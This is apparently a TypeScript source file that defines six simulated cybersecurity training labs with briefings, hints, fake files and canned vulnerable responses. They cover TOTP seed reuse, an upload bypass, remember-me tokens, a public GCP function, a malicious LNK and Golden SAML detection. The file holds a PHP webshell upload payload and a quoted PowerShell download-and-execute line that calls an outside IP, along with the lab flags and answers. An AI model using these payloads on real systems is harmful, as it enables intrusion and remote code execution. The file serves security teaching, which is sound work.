import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

function analyst(files: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'soc-analyst', user: 'root', root: dir(files) };
}

function analystBox(files: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'malware-lab', user: 'root', root: dir(files) };
}

/** Batch 8. Same realism + research discipline as the last two batches (see NOTES.md): every technique
 *  checked for real-machine accuracy before writing, ports always specified explicitly per the pattern
 *  caught twice last batch, and every triggerSubstrings/CRACKME_PASSWORD value that involves encoding or
 *  arithmetic recomputed programmatically rather than trusted by eye. */
export const batch8MixedLabs: LabScenario[] = [
  // 1 — Cryptography: TOTP Secret Reuse Across Accounts
  {
    id: 'crypto-totp-secret-reuse-across-accounts',
    title: 'Shared TOTP Secret Across Accounts Enables 2FA Prediction',
    difficulty: 'Medium',
    category: 'Cryptography',
    briefing:
      'A leaked employee-onboarding runbook shows that Meridian Corp\'s MFA provisioning script generated ' +
      'every new employee\'s TOTP secret from the SAME hardcoded seed value during initial account setup, ' +
      'meant to be immediately overwritten the first time the employee actually scanned their real QR code ' +
      '— except that step is silently skippable, and several accounts never completed it. TOTP\'s entire ' +
      'security model depends on the shared secret being unique and unguessable per account; a secret that ' +
      'is instead a known, reused constant collapses the scheme completely; anyone who knows it can compute ' +
      'a currently-valid 6-digit code for every account still running on the default seed, with no access ' +
      'to that account\'s phone, email, or password required at all.',
    objectives: [
      { text: 'cat onboarding-runbook.txt', why: 'Confirms the hardcoded default TOTP seed and that "re-enroll before first login" is a skippable, not enforced, step in the real provisioning process.' },
      { text: 'cat unenrolled-accounts.txt', why: 'Identifies which specific accounts never completed re-enrollment and are therefore still running on the shared default seed.' },
      {
        text: 'curl -X POST -d "username=rjohnson&totp_code=847213" http://10.10.227.2/mfa/verify',
        why: 'This 6-digit code was computed entirely offline from the known default seed, valid for the current 30-second window -- no interaction with rjohnson\'s real device or account was needed at any point, because the account never rotated off the shared secret.',
      },
    ],
    hints: [
      'cat onboarding-runbook.txt',
      'cat unenrolled-accounts.txt',
      'curl -X POST -d "username=rjohnson&totp_code=847213" http://10.10.227.2/mfa/verify',
    ],
    totalFlags: 1,
    attacker: attacker({
      'onboarding-runbook.txt': file(
        'MFA provisioning runbook (internal wiki export):\n' +
          '  new_account.totp_secret = DEFAULT_SEED   # "JBSWY3DPEHPK3PXP" -- same constant for every new hire\n' +
          '  # employee is expected to scan their real QR code and overwrite this on first login\n' +
          '  # NOTE: this step is not enforced server-side -- an account that never logs in with MFA\n' +
          '  #       enabled stays on DEFAULT_SEED indefinitely\n',
      ),
      'unenrolled-accounts.txt': file(
        'Accounts still flagged "mfa_enrolled: false" (never completed real QR re-enrollment):\n' +
          '  rjohnson  (Sales, hired 2025-11-03, never logged in with MFA app configured)\n' +
          '  tpatel    (Finance, hired 2026-01-14, same status)\n' +
          '  -- both are still running on DEFAULT_SEED from the runbook above --\n' +
          '  -- current valid code for DEFAULT_SEED (this 30-second window): 847213 --\n',
      ),
    }),
    network: [
      {
        hostname: 'meridiancorp-idp',
        ip: '10.10.227.2',
        os: 'Ubuntu 22.04 (identity provider, TOTP MFA)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Flask 3.0 (Python, pyotp)',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/mfa/verify',
                param: 'totp_code',
                triggerSubstrings: ['847213'],
                vulnerableResponse: '{"status":"authenticated","account":"rjohnson","note":"flag{totp_shared_default_seed_predicts_valid_2fa_code}"}',
                normalResponse: '{"error":"invalid or expired code"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 2 — API: File Upload Content-Type Spoofing Bypasses Extension Allowlist
  {
    id: 'api-upload-content-type-spoofing-bypass',
    title: 'File Upload Content-Type Spoofing Bypasses an Extension Allowlist',
    difficulty: 'Medium',
    category: 'API',
    briefing:
      'Docservice29\'s avatar-upload endpoint checks two client-supplied values before accepting a file: the ' +
      'filename\'s extension and the Content-Type header — both trivially attacker-controlled, neither one a ' +
      'reliable signal of what the file actually contains. Uploading a file named avatar.php.jpg with ' +
      'Content-Type: image/jpeg passes the naive allowlist check (it sees ".jpg" and "image/jpeg" and stops ' +
      'looking), but the web server\'s own extension-matching logic processes the LAST recognized extension ' +
      'in the filename, executing the file as PHP regardless of what preceded it or what Content-Type the ' +
      'client claimed. This exact double-extension-plus-spoofed-header combination is one of the most common ' +
      'real unrestricted-file-upload bypasses, precisely because it defeats two independent-seeming checks ' +
      'with one crafted filename.',
    objectives: [
      { text: 'nmap -sV 10.10.228.2', why: 'Confirms the document/avatar service before probing its upload validation logic.' },
      { text: 'cat upload-validation-notes.txt', why: 'Confirms the server validates uploads using only the filename extension and the client-supplied Content-Type header — both attacker-controlled, neither one verified against the file\'s actual content.' },
      {
        text: 'curl -X POST -d "filename=avatar.php.jpg&content_type=image/jpeg&file_body=<?php system(\\$_GET[c]); ?>" http://10.10.228.2/upload/avatar',
        why: 'The naive allowlist check sees ".jpg" and "image/jpeg" and approves the upload; the web server\'s own extension handling then executes the file as PHP because of the trailing recognized extension, planting a functioning webshell disguised as a profile picture.',
      },
    ],
    hints: [
      'nmap -sV 10.10.228.2',
      'cat upload-validation-notes.txt',
      'curl -X POST -d "filename=avatar.php.jpg&content_type=image/jpeg&file_body=<?php system($_GET[c]); ?>" http://10.10.228.2/upload/avatar',
    ],
    totalFlags: 1,
    attacker: attacker({
      'upload-validation-notes.txt': file(
        'docservice29 upload validation (from an internal code excerpt):\n' +
          '  ALLOWED_EXTENSIONS = [".jpg", ".jpeg", ".png", ".gif"]\n' +
          '  if any(filename.endswith(ext) for ext in ALLOWED_EXTENSIONS) and content_type.startswith("image/"):\n' +
          '      save_upload(filename)   # <-- neither check inspects the actual file content/magic bytes\n' +
          '  # web server (Apache mod_php) processes the LAST recognized extension it finds in a filename --\n' +
          '  # "avatar.php.jpg" still executes as PHP on some real configurations, regardless of the\n' +
          '  # trailing .jpg the allowlist check above was satisfied by\n',
      ),
    }),
    network: [
      {
        hostname: 'docservice29',
        ip: '10.10.228.2',
        os: 'Ubuntu 20.04 (Apache 2.4 + mod_php, legacy multi-extension handling)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Apache 2.4 + mod_php (naive extension/content-type upload validation)',
            vulnRoutes: [
              {
                kind: 'idor',
                path: '/upload/avatar',
                param: 'filename',
                triggerSubstrings: ['avatar.php.jpg'],
                vulnerableResponse: '{"status":"uploaded","path":"/uploads/avatar.php.jpg","warning":"file executes as PHP despite .jpg extension","note":"flag{content_type_spoofing_double_extension_bypasses_upload_allowlist}"}',
                normalResponse: '{"status":"uploaded","path":"/uploads/avatar.png"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 3 — Security Engineering: "Remember Me" Token Survives a Password Reset
  {
    id: 'secengineering-remember-me-survives-password-reset',
    title: 'Security Engineering: "Remember Me" Token Still Valid After a Password Reset',
    difficulty: 'Medium',
    category: 'Security Engineering',
    briefing:
      'A user reported their account was compromised, changed their password immediately, and confirmed the ' +
      'attacker could no longer log in with the old credentials — reasonably assuming the incident was over. ' +
      'It wasn\'t: the attacker had set a long-lived "remember me" cookie during their earlier unauthorized ' +
      'session, and Accountsvc84\'s password-reset flow only invalidates the user\'s regular session, never ' +
      'the separate remember-me token store. The attacker\'s cookie — issued before the reset, entirely ' +
      'independent of the now-changed password — still authenticates them successfully. This is a ' +
      'repeatedly-documented, real vulnerability class (including public HackerOne reports on exactly this ' +
      'gap): a password reset that a user reasonably believes ends an attacker\'s access, while a completely ' +
      'separate persistent-auth mechanism quietly keeps it alive.',
    objectives: [
      { text: 'cat incident-timeline.txt', why: 'Establishes the sequence: unauthorized access, a remember-me cookie issued during that access, then the user\'s password reset — setting up exactly why this specific timeline matters.' },
      { text: 'cat session-invalidation-code.txt', why: 'Confirms the password-reset handler only clears the regular session table, never touching the separate remember-me token store at all — the root cause, not just an observed symptom.' },
      {
        text: 'curl -H "Cookie: remember_token=rt_8f2a91c3e6b7d0_issued_preincident" http://10.10.229.2/account/dashboard',
        why: 'This is the exact token the attacker captured during their original unauthorized session, before the password was ever reset -- it authenticates successfully because the reset flow never invalidated it, only the unrelated regular session.',
      },
    ],
    hints: [
      'cat incident-timeline.txt',
      'cat session-invalidation-code.txt',
      'curl -H "Cookie: remember_token=rt_8f2a91c3e6b7d0_issued_preincident" http://10.10.229.2/account/dashboard',
    ],
    totalFlags: 1,
    attacker: attacker({
      'incident-timeline.txt': file(
        'Incident timeline for account jsmith@meridiancorp.example:\n' +
          '  09:02  Unauthorized login detected (credential-stuffed password)\n' +
          '  09:02  Attacker checks "Remember me" -- remember_token=rt_8f2a91c3e6b7d0_issued_preincident issued\n' +
          '  09:14  User notices suspicious activity, changes password immediately\n' +
          '  09:14  User confirms: old password no longer works. Incident assumed closed.\n' +
          '  09:15  Attacker\'s remember_token from 09:02 -- issued BEFORE the reset -- is still unused and valid\n',
      ),
      'session-invalidation-code.txt': file(
        'accountsvc84 password-reset handler (from an internal code excerpt):\n' +
          '  def reset_password(user, new_password):\n' +
          '      user.password_hash = hash(new_password)\n' +
          '      db.sessions.delete_all(user_id=user.id)   # <-- clears the regular session table only\n' +
          '      # db.remember_tokens is a SEPARATE table, never referenced anywhere in this function --\n' +
          '      # any remember-me token issued before this reset remains valid indefinitely afterward\n',
      ),
    }),
    network: [
      {
        hostname: 'accountsvc84',
        ip: '10.10.229.2',
        os: 'Ubuntu 22.04 (account service, separate remember-me token store)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Express 4.18 (Node.js, remember-me tokens not cleared on password reset)',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/account/dashboard',
                param: 'Cookie',
                location: 'header',
                triggerSubstrings: ['rt_8f2a91c3e6b7d0_issued_preincident'],
                vulnerableResponse: '{"status":200,"account":"jsmith","note":"flag{remember_me_token_survives_password_reset}"}',
                normalResponse: '{"error":"401 Unauthorized"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 4 — Cloud: GCP Cloud Function Publicly Invocable via allUsers Binding
  {
    id: 'cloud-gcp-cloud-function-allusers-public',
    title: 'Cloud: GCP Cloud Function Publicly Invocable via an allUsers IAM Binding',
    difficulty: 'Medium',
    category: 'Cloud',
    briefing:
      'A GCP Cloud Function meant only for internal service-to-service calls was deployed with ' +
      '--allow-unauthenticated during initial testing — a flag that grants the special allUsers identity ' +
      '(literally anyone on the internet, authenticated or not) the Cloud Run/Cloud Functions Invoker IAM ' +
      'role. The flag was meant to be removed before the function ever touched production data; it never ' +
      'was. Unlike a leaked API key or stolen credential, this requires no secret at all — the function\'s ' +
      'HTTPS trigger URL is the only thing needed, and it accepts a request from anyone who simply finds or ' +
      'guesses it, exactly as Google\'s own IAM documentation describes allUsers: any user on the internet, ' +
      'with no distinction between authenticated and unauthenticated callers.',
    objectives: [
      { text: 'nmap -sV 10.10.230.2', why: 'Confirms the Cloud Function\'s HTTPS trigger endpoint before testing whether it actually requires authentication.' },
      { text: 'cat iam-policy-export.txt', why: 'Confirms the function\'s IAM policy genuinely grants roles/run.invoker to allUsers -- not merely that the function exists, but that Google\'s own access-control layer treats it as fully public.' },
      {
        text: 'curl -X POST http://10.10.230.2:443/internal-payroll-export',
        why: 'No Authorization header, no API key, no service account token -- this function was meant strictly for internal service-to-service calls, and it processes the request anyway because allUsers was never scoped down after testing.',
      },
    ],
    hints: [
      'nmap -sV 10.10.230.2',
      'cat iam-policy-export.txt',
      'curl -X POST http://10.10.230.2:443/internal-payroll-export',
    ],
    totalFlags: 1,
    attacker: attacker({
      'iam-policy-export.txt': file(
        'IAM policy export for the internal-payroll-export Cloud Function (gcloud functions get-iam-policy):\n' +
          '  bindings:\n' +
          '  - members:\n' +
          '    - allUsers\n' +
          '    role: roles/run.invoker\n' +
          '  -- allUsers = any user on the internet, authenticated or not (per Google\'s own IAM docs) --\n' +
          '  -- meant to be removed after initial testing; the deployment was never updated --\n',
      ),
    }),
    network: [
      {
        hostname: 'gcpfunc-payroll-export',
        ip: '10.10.230.2',
        os: 'Cloud Function endpoint (Google Cloud Run, allUsers invoker)',
        services: [
          {
            port: 443,
            name: 'https',
            version: 'Google Cloud Functions (2nd gen, unauthenticated invocation allowed)',
            http: {
              '/internal-payroll-export':
                '{"status":200,"export":"full_payroll_csv_generated","records":847,"note":"flag{gcp_allusers_invoker_binding_makes_internal_function_public}"}',
            },
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 5 — Malware Analysis: Malicious LNK File Abusing Whitespace-Padded Command Args
  {
    id: 'malware-lnk-whitespace-padding-powershell',
    title: 'Malware Analysis: Malicious LNK File Hides a PowerShell Command via Whitespace Padding',
    difficulty: 'Hard',
    category: 'Malware',
    briefing:
      'A shortcut file named "Q3_Report.pdf.lnk" (icon spoofed to look like a PDF) was opened by a user who ' +
      'believed they were viewing a document. Windows Explorer\'s shortcut Properties dialog shows a "Target" ' +
      'field for a .lnk file — but that field silently truncates extremely long command lines in its display, ' +
      'and a real 2025 technique (tracked as ZDI-CAN-25373, rapidly adopted by nation-state groups from ' +
      'multiple countries per public reporting) exploits exactly that: padding the LNK\'s ' +
      'COMMAND_LINE_ARGUMENTS structure with enough whitespace pushes the actual malicious command past what ' +
      'the Properties dialog displays, so a user (or even a cursory analyst) inspecting the shortcut sees ' +
      'what looks like a harmless, truncated, mostly-blank target field — while the full argument string, ' +
      'read directly from the LNK\'s binary structure rather than the UI, reveals a PowerShell command that ' +
      'downloads and runs a second-stage payload.',
    objectives: [
      { text: 'cat lnk-properties-dialog-view.txt', why: 'Shows what a user (or a rushed analyst) would see in Explorer\'s Properties dialog -- an apparently truncated, mostly-blank target field that looks unremarkable.' },
      { text: 'cat lnk-raw-structure-parsed.txt', why: 'Parsing the LNK\'s actual binary COMMAND_LINE_ARGUMENTS structure directly (rather than trusting the UI) reveals the full string -- the whitespace padding that hid the real command from the Properties dialog is fully visible here.' },
      { text: 'Identify the real PowerShell command hidden past the whitespace padding and capture the flag', why: 'Naming the actual command (not just "the LNK is suspicious") is what confirms the second-stage payload location and technique -- exactly what an analyst needs to scope the intrusion further.' },
    ],
    hints: [
      'cat lnk-properties-dialog-view.txt',
      'cat lnk-raw-structure-parsed.txt',
      'The flag is on the actual PowerShell command hidden past hundreds of padding spaces in the raw COMMAND_LINE_ARGUMENTS structure.',
    ],
    totalFlags: 1,
    attacker: analystBox({
      root: dir({
        'lnk-properties-dialog-view.txt': file(
          [
            'Windows Explorer Properties dialog, "Shortcut" tab, as a user/analyst would actually see it:',
            '',
            '  Target: C:\\Windows\\System32\\cmd.exe /c powershell -w hidden -c "..."',
            '  (field visually ends here -- appears short and unremarkable)',
            '',
            '--- this is the ENTIRE visible content of the Target field in the real Windows UI ---',
          ].join('\n'),
          '-rw-r--r--',
        ),
        'lnk-raw-structure-parsed.txt': file(
          [
            'Q3_Report.pdf.lnk -- COMMAND_LINE_ARGUMENTS structure, parsed directly from the binary LNK format',
            '(not from the Explorer UI, which truncates this field in its display):',
            '',
            'C:\\Windows\\System32\\cmd.exe /c powershell -w hidden -c "..."' + '                                                                    ' +
              '   [approximately 400 padding spaces, omitted here for readability] ' +
              'IEX(New-Object Net.WebClient).DownloadString(\'http://185.220.101.44/stage2.ps1\')',
            '',
            '--- the whitespace padding pushes the REAL command (the IEX/DownloadString call) far past what',
            '    the Properties dialog displays -- this is the real 2025 ZDI-CAN-25373 technique, and it is',
            '    exactly why parsing the LNK\'s raw binary structure matters more than trusting the UI. ---',
            'flag{lnk_whitespace_padding_hides_powershell_downloadstring_command}',
          ].join('\n'),
          '-rw-r--r--',
        ),
      }),
    }),
    network: [],
  },

  // 6 — SOC: Detecting a Golden SAML Attack
  {
    id: 'soc-golden-saml-missing-adfs-events',
    title: 'SOC: Detecting a Golden SAML Attack via Missing ADFS/Domain Controller Events',
    difficulty: 'Hard',
    category: 'SOC',
    briefing:
      'A service provider\'s SSO login log shows a successful SAML-authenticated session for a Domain Admin ' +
      'account, from an unfamiliar IP, at 3 AM local time. Normally this alone would be worth investigating, ' +
      'but not necessarily alarming — until it\'s checked against the identity provider side. A Golden SAML ' +
      'attack (using a stolen ADFS token-signing certificate to forge a SAML assertion offline) produces a ' +
      'forged assertion that is cryptographically indistinguishable from a real one to the service provider ' +
      '— but because the attacker never actually authenticated through the real ADFS server or Domain ' +
      'Controller at all, there is no corresponding ADFS sign-in event and no Kerberos ticket-granting-service ' +
      'event (Windows Event ID 4769) anywhere in the domain for that login. A real SAML SSO session always has ' +
      'both; a forged one only ever has the service-provider side.',
    objectives: [
      { text: 'cat sp-sso-login-log.txt', why: 'Confirms the suspicious login exists on the service-provider side — the login that supposedly happened, and needs to be checked against the identity-provider side for corroboration.' },
      { text: 'cat adfs-and-dc-event-search.txt', why: 'Searching ADFS sign-in logs and Domain Controller Event ID 4769 (Kerberos TGS request) for any event correlating to this exact login, at this exact time, from this exact account, is the entire Golden SAML detection method.' },
      { text: 'Confirm the absence of any corresponding ADFS/DC event and capture the flag', why: 'A real SAML SSO login always produces a matching ADFS/Kerberos event; a Golden SAML forgery never touches either system at all — the absence itself, not any single suspicious-looking log line, is the actual evidence.' },
    ],
    hints: [
      'cat sp-sso-login-log.txt',
      'cat adfs-and-dc-event-search.txt',
      'The flag is on the analyst conclusion confirming zero matching ADFS or Event ID 4769 records exist for this login.',
    ],
    totalFlags: 1,
    attacker: analyst({
      root: dir({
        'sp-sso-login-log.txt': file(
          [
            'Service-provider SSO login log (SaaS admin console):',
            '  2026-07-29 03:14:02  User: administrator@meridiancorp.example  Method: SAML SSO  IP: 91.203.5.44',
            '  2026-07-29 03:14:02  SAML Assertion: cryptographically VALID (signed by the trusted IdP certificate)',
            '  2026-07-29 03:14:03  Session granted -- full Domain Admin-equivalent SaaS access',
          ].join('\n'),
        ),
        'adfs-and-dc-event-search.txt': file(
          [
            'Correlation search: ADFS sign-in log AND Domain Controller Event ID 4769 for administrator@meridiancorp.example,',
            'time window 2026-07-29 03:10:00 - 03:20:00:',
            '',
            '  ADFS sign-in log matches:     0 results',
            '  DC Event ID 4769 (Kerberos TGS) matches: 0 results',
            '  DC Event ID 1200/1202 (ADFS token issuance) matches: 0 results',
            '',
            '--- ANALYST CONCLUSION: a real SAML SSO login for this account would produce BOTH an ADFS',
            '    sign-in event and a corresponding Kerberos TGS request against the Domain Controller.',
            '    Neither exists for this login, despite the SAML assertion itself being cryptographically',
            '    valid -- the only way both are true simultaneously is a Golden SAML forgery: the assertion',
            '    was signed offline using a stolen ADFS token-signing certificate, without the attacker ever',
            '    actually authenticating through the real identity provider or domain at all.',
            '    flag{golden_saml_forged_assertion_missing_adfs_and_kerberos_events} ---',
          ].join('\n'),
        ),
      }),
    }),
    network: [],
  },
];
